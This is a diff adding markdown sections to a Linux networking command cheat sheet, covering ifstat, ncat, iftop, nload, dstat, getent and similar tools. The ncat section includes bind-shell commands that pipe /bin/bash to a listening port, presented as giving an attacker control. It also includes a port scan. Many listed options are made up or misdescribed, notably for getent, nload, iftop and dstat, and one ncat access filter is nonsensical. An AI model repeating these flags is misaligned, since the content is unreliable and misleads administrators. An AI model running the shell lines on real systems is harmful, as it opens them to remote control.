@@ -4240,5 +4240,1609 @@ tracepath -n -v -4 example.com
 ```
 </details>
 <details>
-<summary></summary>
+<summary>ifstat</summary>
 
+The `ifstat` command displays real-time network interface bandwidth usage (input/output) in a simple table format.
+
+### **1. Basic usage (all interfaces)**
+
+```bash
+ifstat
+```
+
+Displays current network traffic (KB/s) for all interfaces.
+
+---
+
+### **2. Monitor a specific interface**
+
+```bash
+ifstat -i eth0
+```
+
+Only shows stats for `eth0`.
+
+---
+
+### **3. Set update interval**
+
+```bash
+ifstat 2
+```
+
+Updates every 2 seconds.
+
+---
+
+### **4. Show a limited number of updates**
+
+```bash
+ifstat 1 5
+```
+
+Displays stats every 1 second, 5 times.
+
+---
+
+### **5. Include timestamps**
+
+```bash
+ifstat -t
+```
+
+Shows current time along with traffic stats.
+
+---
+
+### **6. Display traffic in bytes instead of KB**
+
+```bash
+ifstat -b
+```
+
+Useful if you want exact byte counts.
+
+---
+
+### **7. Monitor multiple specific interfaces**
+
+```bash
+ifstat -i eth0,eth1
+```
+
+Shows stats only for `eth0` and `eth1`.
+
+---
+
+### **8. Show cumulative averages**
+
+```bash
+ifstat -a
+```
+
+Displays average traffic since the command started.
+
+---
+
+### **9. Change output format**
+
+```bash
+ifstat -n
+```
+
+Prevents headers from being repeated each interval (cleaner output).
+
+---
+
+### **10. Set custom width for columns**
+
+```bash
+ifstat -w 15
+```
+
+Adjusts column width for better readability.
+
+---
+
+### **11. Use kilobits instead of kilobytes**
+
+```bash
+ifstat -k
+```
+
+Shows traffic in kilobits/sec.
+
+---
+
+### **12. Combine timestamp with specific interface**
+
+```bash
+ifstat -t -i eth0
+```
+
+Timestamped stats for `eth0`.
+
+---
+
+### **13. Continuous monitoring for scripting**
+
+```bash
+ifstat -q 1
+```
+
+`-q` suppresses headers; useful for scripts, updates every 1 second.
+
+---
+
+### **14. Show all interfaces except loopback**
+
+```bash
+ifstat -i $(ls /sys/class/net | grep -v lo | tr '\n' ',')
+```
+
+Automatically excludes the loopback interface.
+
+---
+
+### **15. Output only averages at the end**
+
+```bash
+ifstat -a 2 5
+```
+
+Updates every 2 seconds, 5 times, then shows averages.
+</details>
+<details>
+<summary>dnsdomainname</summary>
+
+`dnsdomainname` command prints the DNS domain name of the host system
+
+### **1. Basic usage**
+
+```bash
+dnsdomainname
+```
+
+Outputs the DNS domain name of the host (e.g., `example.com`).
+
+---
+
+### **2. Combined with `hostname` to get FQDN**
+
+```bash
+hostname -f
+```
+
+`dnsdomainname` alone gives the domain part, while `hostname -f` gives the full domain name including the host.
+
+---
+
+### **3. Using `dnsdomainname` in a script**
+
+```bash
+echo "My domain is: $(dnsdomainname)"
+```
+
+Prints a custom message with the domain name.
+
+---
+
+### **4. Check if domain is set**
+
+```bash
+[ -z "$(dnsdomainname)" ] && echo "No domain configured" || echo "Domain: $(dnsdomainname)"
+```
+
+Useful for system checks.
+
+---
+
+### **5. Store domain in a variable**
+
+```bash
+MYDOMAIN=$(dnsdomainname)
+echo $MYDOMAIN
+```
+
+Can be used in automation scripts.
+
+---
+
+### **6. Combine with `hostname` to display host and domain**
+
+```bash
+echo "$(hostname).$(dnsdomainname)"
+```
+
+Outputs the full hostname with domain.
+
+---
+
+### **7. Use in conditional checks**
+
+```bash
+if [ "$(dnsdomainname)" = "example.com" ]; then echo "This is the production domain"; fi
+```
+
+Useful for server-specific scripts.
+
+---
+
+### **8. Combine with `awk` to extract parts**
+
+```bash
+dnsdomainname | awk -F. '{print $1}'
+```
+
+Prints the first segment of the domain name.
+
+---
+
+### **9. Verify domain in network troubleshooting**
+
+```bash
+ping $(dnsdomainname)
+```
+
+Can help verify DNS resolution in some setups.
+
+---
+
+### **10. Redirect output to a file**
+
+```bash
+dnsdomainname > /tmp/domain.txt
+```
+
+Stores the domain name for later use.
+
+---
+
+### **11. Using with `cut` to extract subdomain**
+
+```bash
+dnsdomainname | cut -d. -f2-
+```
+
+Prints everything except the first segment of the domain.
+
+---
+
+### **12. Combine with `nslookup`**
+
+```bash
+nslookup $(dnsdomainname)
+```
+
+Checks DNS records for the domain.
+
+---
+
+### **13. Use in a cron job to log domain**
+
+```bash
+* * * * * echo "$(date) - Domain: $(dnsdomainname)" >> /var/log/domain.log
+```
+
+Logs the domain name every minute (for monitoring purposes).
+
+---
+
+### **14. Use with `grep` to verify a substring**
+
+```bash
+dnsdomainname | grep "example"
+```
+
+Checks if the domain contains “example”.
+
+---
+
+### **15. Print domain along with IP address**
+
+```bash
+echo "$(dnsdomainname) $(hostname -I)"
+```
+
+Displays the domain and the host IP(s).
+</details>
+<details>
+<summary>nmtui</summary>
+
+`nmtui` command in Linux provides a text-based user interface for NetworkManager to manage network connections.
+
+### **1. Launch `nmtui` main menu**
+
+```bash
+nmtui
+```
+
+Opens the main interactive text interface for managing connections.
+
+---
+
+### **2. Edit a network connection**
+
+```bash
+nmtui edit
+```
+
+Opens the interface to edit an existing network connection (IP, DNS, etc.).
+
+---
+
+### **3. Activate a network connection**
+
+```bash
+nmtui activate
+```
+
+Shows a list of available connections to activate.
+
+---
+
+### **4. Deactivate a connection**
+
+```bash
+nmtui deactivate
+```
+
+Lets you select an active connection to deactivate.
+
+---
+
+### **5. Set hostname interactively**
+
+```bash
+nmtui hostname
+```
+
+Allows you to set the system hostname through the text interface.
+
+---
+
+### **6. Use `nmtui` in a script-friendly way**
+
+```bash
+nmtui-connect
+```
+
+Provides a menu to connect to Wi-Fi networks directly.
+
+---
+
+### **7. Activate a connection by name (script)**
+
+```bash
+nmcli connection up <connection_name>
+```
+
+While `nmtui` is interactive, `nmcli` complements it for scripts.
+
+---
+
+### **8. Edit connection without GUI**
+
+```bash
+nmtui edit <connection_name>
+```
+
+Opens the editor directly for a specific connection.
+
+---
+
+### **9. Add a new connection**
+
+```bash
+nmtui add
+```
+
+Lets you create a new wired or wireless connection.
+
+---
+
+### **10. Quit `nmtui`**
+
+While in `nmtui`, use arrow keys to select **Quit** or press `Esc` until the program exits.
+
+---
+
+### **11. Use arrow keys for navigation**
+
+In any menu, navigate options, select **OK** or **Cancel**, and press `Enter` to confirm.
+
+---
+
+### **12. Change IP settings**
+
+Inside `nmtui edit`:
+
+* Select connection → **Edit**
+* Set IP to static or dynamic (DHCP)
+* Configure DNS, gateway, etc.
+
+---
+
+### **13. Connect to Wi-Fi**
+
+Inside `nmtui`:
+
+* Select **Activate a connection**
+* Choose your Wi-Fi
+* Enter password if required
+
+---
+
+### **14. Switch between connections**
+
+Inside **Activate a connection**, you can deactivate the current one and activate another.
+
+---
+
+### **15. Combine `nmtui` and `nmcli` for status**
+
+```bash
+nmtui && nmcli device status
+```
+
+Use `nmtui` to make changes, then `nmcli` to verify network state.
+</details>
+<details>
+<summary>ip addr</summary>
+
+`ip addr` command in Linux is used to show and manage network interfaces and IP addresses. 
+
+### **1. Show all network interfaces and their IP addresses**
+
+```bash
+ip addr
+```
+
+Displays a list of all network interfaces along with their IP addresses and related information.
+
+---
+
+### **2. Show a specific interface's details**
+
+```bash
+ip addr show eth0
+```
+
+Shows the IP address details for the `eth0` interface.
+
+---
+
+### **3. Show only IPv4 addresses**
+
+```bash
+ip -4 addr
+```
+
+Displays only the IPv4 addresses of the network interfaces.
+
+---
+
+### **4. Show only IPv6 addresses**
+
+```bash
+ip -6 addr
+```
+
+Displays only the IPv6 addresses of the network interfaces.
+
+---
+
+### **5. Display IP addresses of a specific interface**
+
+```bash
+ip addr show dev eth0
+```
+
+Displays the IP addresses associated with the `eth0` interface.
+
+---
+
+### **6. Display the IP address of a specific interface**
+
+```bash
+ip addr show dev eth0 | grep inet
+```
+
+Filters the output to show only the IPv4 address for `eth0`.
+
+---
+
+### **7. Display network interfaces with summary**
+
+```bash
+ip -brief addr
+```
+
+Displays a compact, summary view of all network interfaces and their IPs.
+
+---
+
+### **8. Display the MAC address of a specific interface**
+
+```bash
+ip addr show eth0 | grep link
+```
+
+Filters the output to show the MAC address of `eth0`.
+
+---
+
+### **9. Show details of interfaces with the `inet` keyword (for IPv4)**
+
+```bash
+ip addr show | grep inet
+```
+
+Displays only IPv4 addresses by filtering for the `inet` keyword.
+
+---
+
+### **10. Show a summary of the IP configuration of the system**
+
+```bash
+ip addr show
+```
+
+Provides detailed output, including interface names, IP addresses, and subnet masks.
+
+---
+
+### **11. Display IP address, subnet mask, and broadcast address**
+
+```bash
+ip addr show eth0
+```
+
+Shows IP, subnet, and broadcast address for `eth0`.
+
+---
+
+### **12. Display IP addresses with network prefixes**
+
+```bash
+ip addr show dev eth0 | grep inet
+```
+
+Shows the IP addresses of `eth0` with their network prefix (e.g., `192.168.1.10/24`).
+
+---
+
+### **13. Display all addresses, including loopback and inactive interfaces**
+
+```bash
+ip addr show
+```
+
+Shows all addresses, even if the interface is down (like `lo`).
+
+---
+
+### **14. Show addresses without interface names**
+
+```bash
+ip addr | grep inet | awk '{print $2}'
+```
+
+Displays only the IP addresses, omitting the interface names.
+
+---
+
+### **15. Display IP address of a specific interface with detailed information**
+
+```bash
+ip addr show eth0 | awk '/inet/ {print $2}'
+```
+
+Displays the IPv4 address of the `eth0` interface in a simpler format (`192.168.1.10/24`).
+</details>
+<details>
+<summary>ncat</summary>
+
+`ncat` is a command-line networking tool that comes with **Nmap** and can be used for reading and writing data across networks. It's often used for tasks such as port scanning, network troubleshooting, and secure connections. 
+
+### **1. Basic usage (start a simple TCP server)**
+
+```bash
+ncat -l 12345
+```
+
+Starts a server that listens on TCP port 12345, allowing connections to be made to that port.
+
+---
+
+### **2. Connect to a remote server**
+
+```bash
+ncat example.com 80
+```
+
+Connects to `example.com` on port 80 (HTTP). This can be used to interact with web servers.
+
+---
+
+### **3. Set a specific address and port to listen on**
+
+```bash
+ncat -l 192.168.1.10 12345
+```
+
+Starts a listener on IP `192.168.1.10` and port `12345`.
+
+---
+
+### **4. Enable encryption (SSL/TLS) for the connection**
+
+```bash
+ncat --ssl example.com 443
+```
+
+Connects to `example.com` on port 443 using SSL/TLS encryption.
+
+---
+
+### **5. Start a simple chat server**
+
+```bash
+ncat -l 12345
+```
+
+Run this on one machine as a server, and then on another machine, connect using:
+
+```bash
+ncat <server_ip> 12345
+```
+
+This creates a simple two-way communication (chat) session.
+
+---
+
+### **6. Send a file to a remote machine**
+
+```bash
+ncat -l 12345 > received_file.txt
+```
+
+Start the listener to save the received file. Then, on another machine:
+
+```bash
+ncat <server_ip> 12345 < file_to_send.txt
+```
+
+This transfers `file_to_send.txt` to the remote server.
+
+---
+
+### **7. Use `ncat` for port scanning (scan a range of ports)**
+
+```bash
+ncat -z -v example.com 1-1000
+```
+
+Scans ports 1-1000 on `example.com`. The `-z` flag tells `ncat` to only scan without sending data, and `-v` enables verbose output.
+
+---
+
+### **8. Connect to a server and use it as a proxy**
+
+```bash
+ncat --proxy <proxy_ip>:<proxy_port> example.com 80
+```
+
+This connects to `example.com` on port 80, using the specified proxy.
+
+---
+
+### **9. Listen and display HTTP requests (web server simulation)**
+
+```bash
+ncat -l 8080
+```
+
+This starts a listener on port 8080 and displays any incoming HTTP requests sent to it.
+
+---
+
+### **10. Bind to an interface**
+
+```bash
+ncat -l -s 192.168.1.10 12345
+```
+
+This makes `ncat` bind to the IP address `192.168.1.10` while listening on port `12345`.
+
+---
+
+### **11. Limit incoming connection to a specific IP**
+
+```bash
+ncat -l 12345 --sh-execute "if [ \$SSH_CONNECTION != '192.168.1.50' ]; then exit; fi"
+```
+
+Only allows connections from IP `192.168.1.50` to connect to the listener.
+
+---
+
+### **12. Using `ncat` as a simple HTTP client**
+
+```bash
+echo -e "GET / HTTP/1.1\r\nHost: example.com\r\n\r\n" | ncat example.com 80
+```
+
+Sends an HTTP GET request to `example.com` on port 80.
+
+---
+
+### **13. Listen for incoming connections and execute commands**
+
+```bash
+ncat -l -p 12345 -e /bin/bash
+```
+
+When a client connects to port 12345, it will execute `/bin/bash`, effectively giving the client shell access.
+
+---
+
+### **14. Use `ncat` with SOCKS proxy**
+
+```bash
+ncat --proxy-type socks5 --proxy <proxy_ip>:<proxy_port> example.com 80
+```
+
+Connects to `example.com` on port 80 using a SOCKS5 proxy.
+
+---
+
+### **15. Create a reverse shell**
+
+On the target machine (listens for connection):
+
+```bash
+ncat -l 12345 -e /bin/bash
+```
+
+On the attacking machine (connects back to the target):
+
+```bash
+ncat <target_ip> 12345
+```
+
+This opens a reverse shell, giving the attacker control of the target machine.
+</details>
+<details>
+<summary>systemctl restart network</summary>
+
+`systemctl restart network` command in Linux is used to restart the network service, which can help apply changes to network configurations or troubleshoot connectivity issues. 
+
+### **1. Restart the network service**
+
+```bash
+sudo systemctl restart network
+```
+
+This command restarts the entire network service. It can be used when you modify network configurations (e.g., `/etc/sysconfig/network-scripts/`).
+
+---
+
+### **2. Restart the network service on a specific interface (e.g., `eth0`)**
+
+```bash
+sudo systemctl restart network@eth0
+```
+
+This restarts only the network service for the specific interface `eth0`. The service is named as `network@<interface>` on many modern Linux distributions (like RHEL/CentOS).
+
+---
+
+### **3. Check the status of the network service**
+
+```bash
+sudo systemctl status network
+```
+
+Displays the current status of the `network` service, including whether it’s active, inactive, or failed.
+
+---
+
+### **4. Restart network service on a system with `NetworkManager`**
+
+```bash
+sudo systemctl restart NetworkManager
+```
+
+If your system is using `NetworkManager` instead of the traditional network service, this will restart it and reapply any changes to network configurations.
+
+---
+
+### **5. Restart the network service on a specific interface using `nmcli`**
+
+```bash
+sudo nmcli connection reload
+```
+
+For systems using `NetworkManager`, this command reloads the network configurations of all active connections without needing to restart the entire service.
+
+---
+
+### **6. Restart network service and view logs (for troubleshooting)**
+
+```bash
+sudo systemctl restart network && journalctl -xe | grep network
+```
+
+This restarts the network service and immediately shows any relevant logs from `journalctl` related to networking, which is useful for troubleshooting.
+
+---
+
+### **7. Disable automatic startup of the network service**
+
+```bash
+sudo systemctl disable network
+```
+
+Disables the network service from starting automatically on boot.
+
+---
+
+### **8. Enable automatic startup of the network service**
+
+```bash
+sudo systemctl enable network
+```
+
+Enables the network service to start automatically at boot time.
+
+---
+
+### **9. Stop the network service**
+
+```bash
+sudo systemctl stop network
+```
+
+Stops the network service. Useful if you need to temporarily disable networking, but be cautious as this will disrupt your network connectivity.
+
+---
+
+### **10. Start the network service after it has been stopped**
+
+```bash
+sudo systemctl start network
+```
+
+Starts the network service if it was previously stopped.
+
+---
+
+### **11. Restart network service and reapply DNS settings**
+
+If you change `/etc/resolv.conf` or DNS settings, you may need to restart the network service for changes to take effect:
+
+```bash
+sudo systemctl restart network
+```
+
+---
+
+### **12. Restart the network service and check IP addresses**
+
+After restarting the network service, you can check the new IP addresses assigned to interfaces:
+
+```bash
+sudo systemctl restart network && ip addr
+```
+
+This shows the IP addresses after restarting the network service.
+
+---
+
+### **13. Restart network service and test connectivity**
+
+After making network changes, restart the service and then test connectivity using `ping`:
+
+```bash
+sudo systemctl restart network && ping -c 4 google.com
+```
+
+Pings `google.com` to ensure that the network service is working properly after a restart.
+
+---
+
+### **14. Restart network and apply static IP changes**
+
+If you've modified static IP configuration files (e.g., `/etc/sysconfig/network-scripts/ifcfg-eth0`), restart the network service:
+
+```bash
+sudo systemctl restart network
+```
+
+This applies the changes to your static IP configuration.
+
+---
+
+### **15. Restart network on a system with `systemd` networking**
+
+```bash
+sudo systemctl restart systemd-networkd
+```
+
+For systems using `systemd-networkd`, this command restarts the network service managed by `systemd`.
+</details>
+<details>
+<summary>iftop</summary>
+
+`iftop` command in Linux is used to display bandwidth usage on an interface, providing real-time network monitoring. It is useful for troubleshooting network issues or identifying bandwidth-heavy processes. 
+
+### **1. Display bandwidth usage on the default interface**
+
+```bash
+sudo iftop
+```
+
+This command shows a real-time view of bandwidth usage on the default network interface (typically `eth0` or `ens33`).
+
+---
+
+### **2. Monitor a specific network interface**
+
+```bash
+sudo iftop -i eth0
+```
+
+Monitor bandwidth usage specifically on the `eth0` interface.
+
+---
+
+### **3. Display bandwidth in bits per second**
+
+```bash
+sudo iftop -B
+```
+
+This option changes the default display from bytes to bits per second.
+
+---
+
+### **4. Set a custom update interval**
+
+```bash
+sudo iftop -t 2
+```
+
+This updates the display every 2 seconds. The default is 1 second.
+
+---
+
+### **5. Show bandwidth for both incoming and outgoing traffic**
+
+```bash
+sudo iftop -ni eth0
+```
+
+Shows both incoming and outgoing traffic on interface `eth0`.
+
+---
+
+### **6. Limit display to a specific host**
+
+```bash
+sudo iftop -f "host 192.168.1.10"
+```
+
+This filters the output to show traffic only from or to `192.168.1.10`.
+
+---
+
+### **7. Show traffic by port**
+
+```bash
+sudo iftop -F "port 80"
+```
+
+This displays traffic for port 80, commonly used by HTTP. Useful for monitoring web traffic.
+
+---
+
+### **8. Use `iftop` with port filtering**
+
+```bash
+sudo iftop -F "port 443"
+```
+
+Shows bandwidth usage for port 443 (HTTPS).
+
+---
+
+### **9. Show a more detailed output**
+
+```bash
+sudo iftop -ni eth0 -P
+```
+
+With the `-P` option, `iftop` displays more detailed information about connections, including port numbers.
+
+---
+
+### **10. Show traffic for both IPv4 and IPv6**
+
+```bash
+sudo iftop -6
+```
+
+Display both IPv6 and IPv4 traffic.
+
+---
+
+### **11. Display in a more compact format**
+
+```bash
+sudo iftop -n
+```
+
+Prevents hostname resolution and shows IP addresses directly, providing a faster, more compact output.
+
+---
+
+### **12. Set a threshold for bandwidth usage**
+
+```bash
+sudo iftop -t 1 -s 20
+```
+
+This sets a 1-second interval for the display and will show traffic for a total of 20 seconds.
+
+---
+
+### **13. Show traffic for a specific network range**
+
+```bash
+sudo iftop -f "net 192.168.1.0/24"
+```
+
+Filters the output to show traffic for the entire subnet `192.168.1.0/24`.
+
+---
+
+### **14. Sort by connections with the highest bandwidth usage**
+
+```bash
+sudo iftop -nP -s 60
+```
+
+Sorts by connections with the highest bandwidth usage for 60 seconds, giving you a snapshot of heavy traffic sources.
+
+---
+
+### **15. Show traffic with a specific protocol (e.g., TCP)**
+
+```bash
+sudo iftop -f "tcp"
+```
+
+Displays only TCP traffic. This is useful if you're only interested in certain protocols (e.g., HTTP or FTP).
+</details>
+<details>
+<summary>nload</summary>
+
+`nload` command in Linux is a tool used to monitor network bandwidth usage in real-time. It displays incoming and outgoing traffic separately, making it useful for network diagnostics and monitoring. 
+
+### **1. Basic usage (monitor default interface)**
+
+```bash
+sudo nload
+```
+
+Displays a real-time graph of incoming and outgoing network traffic on the default interface.
+
+---
+
+### **2. Monitor a specific network interface**
+
+```bash
+sudo nload eth0
+```
+
+Monitors the traffic on the `eth0` interface. Replace `eth0` with your desired interface (e.g., `wlan0` for wireless).
+
+---
+
+### **3. Display traffic in a specific unit (e.g., KB, MB)**
+
+```bash
+sudo nload -u M
+```
+
+Displays the traffic in megabytes per second (MB/s). You can also use `K` for kilobytes (KB/s), `M` for megabytes (MB/s), or `G` for gigabytes (GB/s).
+
+---
+
+### **4. Show traffic for both incoming and outgoing on separate graphs**
+
+```bash
+sudo nload -i eth0
+```
+
+Displays two separate graphs for incoming and outgoing traffic on the `eth0` interface.
+
+---
+
+### **5. Monitor multiple interfaces at once**
+
+```bash
+sudo nload eth0 wlan0
+```
+
+Shows real-time traffic graphs for both the `eth0` and `wlan0` interfaces simultaneously.
+
+---
+
+### **6. Change the refresh interval (e.g., update every 2 seconds)**
+
+```bash
+sudo nload -t 2
+```
+
+This updates the display every 2 seconds. The default refresh interval is 500ms.
+
+---
+
+### **7. Disable the display of the graph (numeric only)**
+
+```bash
+sudo nload -g
+```
+
+Only displays the numeric values for incoming and outgoing traffic without the graphical representation.
+
+---
+
+### **8. Show only the incoming or outgoing traffic**
+
+```bash
+sudo nload -i eth0 -t 2 -o
+```
+
+Shows only outgoing traffic for `eth0` with a 2-second update interval.
+
+---
+
+### **9. Save traffic data to a file**
+
+While `nload` doesn't have a direct option to log output to a file, you can use the `tee` command to save the output:
+
+```bash
+sudo nload -t 2 | tee nload_output.txt
+```
+
+Saves the output to `nload_output.txt` while displaying it in real-time.
+
+---
+
+### **10. Monitor a specific network range**
+
+```bash
+sudo nload -f "192.168.1.0/24"
+```
+
+This filters and shows traffic for a specific subnet (e.g., `192.168.1.0/24`).
+
+---
+
+### **11. Display traffic with an additional graph showing total traffic**
+
+```bash
+sudo nload -p
+```
+
+Shows the total traffic in addition to the incoming and outgoing traffic graphs.
+
+---
+
+### **12. Monitor traffic without showing the interface names**
+
+```bash
+sudo nload -n
+```
+
+This hides the interface names, only showing the graphs for traffic (useful for minimal display).
+
+---
+
+### **13. Change the graph resolution (e.g., use a smaller graph)**
+
+```bash
+sudo nload -s 5
+```
+
+This reduces the resolution of the graph, making it smaller. You can adjust the value to get a finer or coarser resolution.
+
+---
+
+### **14. Enable scrolling for large traffic spikes**
+
+```bash
+sudo nload -S
+```
+
+Enables scrolling in the traffic graph to handle large spikes and provides a smoother view.
+
+---
+
+### **15. Set maximum download/upload rate display**
+
+```bash
+sudo nload -l 1000
+```
+
+This limits the display of maximum traffic to 1000 KB/s. Useful if you want to focus on lower bandwidth usage.
+</details>
+<details>
+<summary>dstat</summary>
+
+`dstat` is a versatile tool in Linux that provides real-time system resource statistics, including CPU, disk, network, and memory usage. It's especially useful for performance monitoring and troubleshooting. 
+
+### **1. Basic usage**
+
+```bash
+dstat
+```
+
+Displays a basic summary of CPU, disk, and network usage in real-time. Updates every second by default.
+
+---
+
+### **2. Monitor CPU, memory, and disk activity**
+
+```bash
+dstat -c -m -d
+```
+
+Shows real-time stats for CPU usage (`-c`), memory usage (`-m`), and disk activity (`-d`).
+
+---
+
+### **3. Monitor CPU, memory, and network activity**
+
+```bash
+dstat -c -m -n
+```
+
+Displays CPU, memory, and network interface statistics.
+
+---
+
+### **4. Monitor disk read/write activity**
+
+```bash
+dstat -d
+```
+
+Shows disk read/write activity. Useful for analyzing disk performance.
+
+---
+
+### **5. Show network traffic for all interfaces**
+
+```bash
+dstat -n
+```
+
+Shows the incoming and outgoing network traffic for all network interfaces.
+
+---
+
+### **6. Monitor system load and I/O**
+
+```bash
+dstat -l -d
+```
+
+Displays system load and disk I/O activity.
+
+---
+
+### **7. Display extended information about network stats**
+
+```bash
+dstat -n --net-packets
+```
+
+Shows both network traffic and packet information (e.g., packets sent/received).
+
+---
+
+### **8. Monitor memory usage and swap**
+
+```bash
+dstat -m -S swap
+```
+
+Shows memory usage and swap statistics in real-time.
+
+---
+
+### **9. Show disk usage per device**
+
+```bash
+dstat -d --disk-util
+```
+
+Displays disk usage per device, including I/O utilization.
+
+---
+
+### **10. Show CPU statistics with detailed breakdown**
+
+```bash
+dstat -c --cpu-adv
+```
+
+Shows advanced CPU stats, breaking down usage into user, system, idle, etc.
+
+---
+
+### **11. Monitor disk usage per file system**
+
+```bash
+dstat -D total
+```
+
+Displays total disk activity for all mounted file systems.
+
+---
+
+### **12. Monitor processes and system load**
+
+```bash
+dstat -p -l
+```
+
+Shows process stats alongside system load, providing insight into running processes.
+
+---
+
+### **13. Monitor I/O and network activity with timestamp**
+
+```bash
+dstat -t -d -n
+```
+
+Displays timestamped information for both I/O and network activity.
+
+---
+
+### **14. Monitor system uptime, load, and memory**
+
+```bash
+dstat -t -l -m
+```
+
+Shows the timestamp, system load, and memory usage in a single output.
+
+---
+
+### **15. Custom time interval (e.g., every 5 seconds)**
+
+```bash
+dstat 5
+```
+
+Displays system statistics every 5 seconds instead of the default 1-second interval.
+
+---
+
+### **16. Monitor disk usage with detailed output**
+
+```bash
+dstat -d --disk-tps --disk-async
+```
+
+Shows disk transfers per second (`--disk-tps`) and asynchronous disk operations (`--disk-async`).
+
+---
+
+### **17. Show system-wide disk and network usage**
+
+```bash
+dstat -d -n
+```
+
+Displays both disk and network statistics together for a comprehensive view.
+
+---
+
+### **18. Monitor the system’s power usage (if supported)**
+
+```bash
+dstat -P
+```
+
+Shows power usage statistics for systems with power sensors.
+
+---
+
+### **19. Show stats for a specific process (e.g., PID 1234)**
+
+```bash
+dstat -p 1234
+```
+
+Monitors system statistics specifically for the process with PID `1234`.
+
+---
+
+### **20. Show statistics in a CSV format**
+
+```bash
+dstat -c -n --output /tmp/dstat_output.csv
+```
+
+Saves the CPU and network stats into a CSV file for later analysis.
+
+---
+
+### **21. Show stats for specific devices**
+
+```bash
+dstat -d /dev/sda
+```
+
+Shows disk statistics for a specific device (`/dev/sda` in this case).
+</details>
+<details>
+<summary>getent hosts</summary>
+
+The `getent hosts` command in Linux is used to retrieve the hostname-to-IP address mapping from system databases like `/etc/hosts`, DNS, and other network name resolution services (such as NIS or LDAP). It queries the Name Service Switch (NSS) for the hostname information.
+
+### **1. Get the IP address of a hostname**
+
+```bash
+getent hosts example.com
+```
+
+This will display the IP address of `example.com` by querying the system's configured name resolution service (e.g., DNS).
+
+---
+
+### **2. Get the IP address of a local hostname**
+
+```bash
+getent hosts localhost
+```
+
+This retrieves the IP address of the local machine, typically `127.0.0.1` (IPv4) or `::1` (IPv6), depending on the configuration.
+
+---
+
+### **3. Get the IP address and associated hostname**
+
+```bash
+getent hosts 192.168.1.10
+```
+
+This will display the hostname(s) associated with the IP address `192.168.1.10`. If it’s a local machine, it might show something like `myhostname 192.168.1.10`.
+
+---
+
+### **4. Get the IP address of a local network machine**
+
+```bash
+getent hosts myserver.local
+```
+
+This will return the IP address of the host `myserver.local`, assuming that the `.local` domain is resolvable (commonly used in mDNS/Bonjour setups).
+
+---
+
+### **5. Display the hosts database**
+
+```bash
+getent hosts
+```
+
+This will display all the hostnames and their corresponding IP addresses from the system’s configured databases (`/etc/hosts`, DNS, etc.).
+
+---
+
+### **6. Query DNS (specifically)**
+
+```bash
+getent hosts -d example.com
+```
+
+While `getent` will normally query all available services (e.g., `/etc/hosts`, DNS, NIS), this can be used to check DNS resolution for `example.com`.
+
+---
+
+### **7. Get IP address of a host using a specific interface's DNS configuration**
+
+```bash
+getent hosts example.com @8.8.8.8
+```
+
+Queries the Google DNS server (`8.8.8.8`) to resolve `example.com`, bypassing the default resolver.
+
+---
+
+### **8. Resolve a hostname from `/etc/hosts`**
+
+```bash
+getent hosts myhost
+```
+
+If `myhost` is listed in your local `/etc/hosts` file, this will return its associated IP address.
+
+---
+
+### **9. Combine `getent` with `grep` to filter specific hosts**
+
+```bash
+getent hosts | grep example.com
+```
+
+This filters the results to only show entries related to `example.com`.
+
+---
+
+### **10. Show detailed information (including aliases) for a hostname**
+
+```bash
+getent hosts example.com | awk '{print $1}'
+```
+
+This extracts and prints only the IP address associated with `example.com` (the first column).
+
+---
+
+### **11. Query for a specific domain**
+
+```bash
+getent hosts mydomain.com
+```
+
+Resolves the IP address for a hostname in `mydomain.com` using the system’s name resolution configuration.
+
+---
+
+### **12. Query an IP address directly for any associated hostnames**
+
+```bash
+getent hosts 192.168.1.20
+```
+
+This resolves `192.168.1.20` to any hostname or alias associated with that IP address.
+
+---
+
+### **13. Query multiple hosts**
+
+```bash
+getent hosts example.com myserver.local
+```
+
+This retrieves IP addresses for multiple hosts in one command.
+
+---
+
+### **14. Use `getent` to troubleshoot name resolution**
+
+```bash
+getent hosts google.com
+```
+
+If DNS or other name resolution services are not working as expected, this command can help troubleshoot if the host can be resolved properly.
+
+---
+
+### **15. Query a network subnet range**
+
+```bash
+getent hosts 192.168.1.0/24
+```
+
+This will return any hosts in the specified subnet if the system is configured to resolve that range.
+</details>
